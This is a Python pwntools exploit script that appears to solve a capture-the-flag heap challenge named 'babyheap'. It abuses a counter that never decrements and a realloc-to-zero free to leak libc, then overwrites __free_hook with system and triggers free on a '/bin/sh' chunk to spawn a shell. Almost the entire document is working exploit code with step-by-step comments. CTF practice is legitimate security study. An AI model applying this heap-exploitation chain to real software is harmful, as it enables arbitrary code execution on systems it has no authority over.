
from pwn import *
 
prompt = ">"
 
def return_to_menu():
    p.sendlineafter(prompt, "5")
 
def add_member(num, names, desc, flag=False):
    p.sendlineafter(prompt, "1")
    p.sendlineafter("employment :", str(num))
    if flag is True:
        return
    for x in xrange(num):
        p.sendlineafter("Name :", names[x])
        p.sendlineafter("Description :", desc[x])
 
def remove_member(idx):
    p.sendlineafter(prompt, "2")
    p.sendlineafter("Index :", str(idx))
 
def edit_member(idx, payload):
    p.sendlineafter(prompt, "4")
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Description :", payload)
 
def manage_team(idx):
    p.sendlineafter(prompt, "3")
    p.sendlineafter("Index :", str(idx))
 
def create_team(len, desc):
    p.sendlineafter(prompt, "1")
    p.sendlineafter("length :", str(len))
    p.sendafter("Description :", desc)
 
def remove_team(idx):
    p.sendlineafter(prompt, "2")
    p.sendlineafter("Index :", str(idx))
 
def list_teams(num):
    p.sendlineafter(prompt, "4")
    for x in xrange(num):
        p.recvuntil("Description : ")
    leak = u64(p.recv(6).ljust(8, "\x00"))
    return leak
 
if __name__ == "__main__":
    p = process("./babyheap")
    create_team(0x20, "aaa\n")
    manage_team(0)
    #
    # obj[0] is desc
    # obj[1] is num_employees
    # obj[2] is table of employees
    #
    # The total number of employees should be 0xff.
    #
    names = ["/bin/sh\x00" for x in xrange(255)]
    add_member(255, names, names)
    #
    # Removing an employee doesn't decrement the counter
    #
    remove_member(0)
    return_to_menu()
    #
    # Each employee object is of size 0xC8.
    # Deleting an employee puts the object in free list.
    # Allocating another team with description size 0xC8
# returns that chunk.
    #
    create_team(0xC8, "\n")
    libc = list_teams(2) - 0x3c4b0a
    free_hook = libc + 0x3c67a8
    system = libc + 0x45390
    log.success("Leaked libc @ {}".format(hex(libc)))
    #
    # Adding one more member makes total = 0x100
    # realloc is called with last byte of total
    # realloc(table, 0) => free(table)
    #
    manage_team(0)
    add_member(1, ["blah"], ["blah"], True)
    return_to_menu()
    #
    # Now we use the create_team function
    # with size of description = 0x7f0
    # So the table will be allocated back to us
    # And we can edit the pointers
    #
    create_team(0x7f0, p64(free_hook))
    #
    # Now we can use the edit functionality of team 0
    # and edit the free hook to point to system.
    # And call free with a block that contains /bin/sh
    #
    manage_team(0)
    edit_member(0, p64(system))
    #
    # Now we've changed the free hook to system
    #
    remove_member(4)
    #
    # And here's the shell
    #
    p.interactive()
